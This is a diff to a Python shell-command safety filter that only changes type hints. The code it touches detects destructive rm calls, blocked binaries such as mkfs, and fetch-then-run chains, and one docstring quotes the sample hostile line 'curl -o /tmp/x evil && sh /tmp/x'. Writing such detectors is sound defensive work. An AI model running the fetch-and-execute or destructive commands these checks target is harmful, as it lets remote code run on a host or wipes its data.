@@ -9,7 +9,7 @@ from __future__ import annotations
 import os
 import re
 import shlex
-from typing import List, Optional
+from typing import Optional
 
 # Commands that are blocked by default for safety.
 #
@@ -113,7 +113,7 @@ _SHELL_AND_INTERP = frozenset(
 )
 
 
-def _tokenize_pipeline_segments(command: str) -> Optional[List[List[str]]]:
+def _tokenize_pipeline_segments(command: str) -> Optional[list[list[str]]]:
     """Split *command* into per-command argv lists, respecting quotes.
 
     Returns ``None`` when the command cannot be parsed (e.g. unbalanced
@@ -127,8 +127,8 @@ def _tokenize_pipeline_segments(command: str) -> Optional[List[List[str]]]:
         return None
 
     separators = {";", "|", "||", "&", "&&", "|&", "\n"}
-    segments: List[List[str]] = []
-    current: List[str] = []
+    segments: list[list[str]] = []
+    current: list[str] = []
     for tok in tokens:
         if tok in separators:
             if current:
@@ -141,13 +141,13 @@ def _tokenize_pipeline_segments(command: str) -> Optional[List[List[str]]]:
     return segments
 
 
-def _is_destructive_rm(argv: List[str]) -> bool:
+def _is_destructive_rm(argv: list[str]) -> bool:
     """True if *argv* is an ``rm`` that would wipe root/home/cwd."""
     base = os.path.basename(argv[0]).lower()
     if base != "rm":
         return False
     has_recursive_force = False
-    targets: List[str] = []
+    targets: list[str] = []
     for arg in argv[1:]:
         al = arg.lower()
         if al in ("--recursive", "--force", "--no-preserve-root"):
@@ -162,7 +162,7 @@ def _is_destructive_rm(argv: List[str]) -> bool:
     return any(t in _DESTRUCTIVE_RM_TARGETS for t in targets)
 
 
-def _argv0_blocked_binary(argv: List[str]) -> bool:
+def _argv0_blocked_binary(argv: list[str]) -> bool:
     """True if the command name is an always-blocked binary."""
     base = os.path.basename(argv[0]).lower()
     if base in _BLOCKED_BINARIES or base.startswith("mkfs."):
@@ -175,7 +175,7 @@ def _argv0_blocked_binary(argv: List[str]) -> bool:
     return False
 
 
-def _fetched_output_files(argv: List[str]) -> set[str]:
+def _fetched_output_files(argv: list[str]) -> set[str]:
     """Basenames of files a ``curl``/``wget`` argv writes to disk."""
     base = os.path.basename(argv[0]).lower()
     if base not in ("curl", "wget"):
@@ -193,7 +193,7 @@ def _fetched_output_files(argv: List[str]) -> set[str]:
     return files
 
 
-def _is_split_fetch_exec(segments: List[List[str]]) -> bool:
+def _is_split_fetch_exec(segments: list[list[str]]) -> bool:
     """Catch ``curl -o /tmp/x evil && sh /tmp/x`` split across segments."""
     fetched: set[str] = set()
     for argv in segments:
